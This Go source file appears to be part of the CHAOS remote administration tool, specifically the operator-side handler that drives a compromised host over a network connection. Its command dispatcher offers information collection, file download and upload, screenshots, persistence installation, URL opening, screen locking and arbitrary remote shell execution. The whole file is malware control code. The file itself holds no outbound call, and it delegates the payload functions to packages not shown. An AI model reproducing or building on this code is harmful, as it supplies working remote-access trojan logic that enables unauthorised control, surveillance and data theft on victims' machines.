package client

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"net"
	"strings"
)

type ClientHandler struct {
	Connection net.Conn
	UseCase    *usecase.UseCase
}

func NewClientHandler(conn net.Conn, useCase *usecase.UseCase) handler.Client {
	return &ClientHandler{
		Connection: conn,
		UseCase:    useCase,
	}
}

func (c ClientHandler) HandleConnection(hostname, user string) {
	p := prompt.New(
		c.executor,
		completer.ClientCompleter,
		prompt.OptionPrefix(fmt.Sprintf("%s@%s > ", hostname, user)),
		prompt.OptionPrefixTextColor(prompt.Yellow),
	)
	p.Run()
}

func (c ClientHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "information":
			c.UseCase.Information.Collect()
			return
		case "download":
			if err := c.UseCase.Download.Validate(values); err != nil {
				fmt.Println(color.Red, "[!] Invalid parameters!")
				return
			}
			c.UseCase.Download.File(values[1])
			return
		case "upload":
			if err := c.UseCase.Upload.Validate(values); err != nil {
				fmt.Println(color.Red, "[!] Invalid parameters!")
				return
			}
			c.UseCase.Upload.File(values[1], values[2])
			return
		case "screenshot":
			if err := c.UseCase.Screenshot.TakeScreenshot(); err != nil {
				fmt.Println(color.Red, "[!] Error processing screenshot!", err.Error())
			}
			return
		case "persistence":
			if err := c.UseCase.Persistence.Validate(values); err != nil {
				fmt.Println(color.Red, "[!] Invalid parameters!")
				return
			}
			if err := c.UseCase.Persistence.Persist(values[1]); err != nil {
				fmt.Println(color.Red, "[!] Error updating persistence!", err.Error())
			}
			return
		case "open-url":
			if err := c.UseCase.OpenURL.Open(values); err != nil {
				fmt.Println(color.Red, "[!] Error opening URL!", err.Error())
			}
			return
		case "lockscreen":
			if err := c.UseCase.LockScreen.Lock(); err != nil {
				fmt.Println(color.Red, "[!] Error locking screen!", err.Error())
			}
			return
		case "exit":
			system.QuitApp()
		default:
			c.UseCase.Terminal.Run(input)
			return
		}
	}
}
